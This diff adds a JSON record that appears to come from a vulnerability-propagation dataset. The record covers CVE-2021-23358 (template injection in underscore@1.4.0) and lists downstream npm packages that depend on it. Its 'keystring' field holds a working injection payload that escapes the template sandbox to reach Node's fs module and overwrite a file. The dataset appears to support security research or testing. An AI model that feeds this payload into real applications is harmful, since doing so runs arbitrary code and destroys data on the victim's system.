@@ -1,0 +1,26 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.4.0",
+  "keymethod": "templateSettings.variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "teepee@2.18.2",
+    "beanbag@3.3.1",
+    "vw-goear-api@1.3.7",
+    "netmorphic@0.4.0",
+    "kaiseki@0.4.0",
+    "net-morphic@0.1.10",
+    "goear_api@1.2.0",
+    "parallel-mocha-jt@0.0.0",
+    "jsgetit@0.0.1",
+    "pmjt@1.0.1",
+    "requester@0.1.0",
+    "sque@0.0.1",
+    "statusdashboard@0.6.0",
+    "statusdashboard-client@0.0.1",
+    "parallel-mocha@0.0.8",
+    "hygiene@0.0.15",
+    "expound@0.3.3"
+  ]
+}
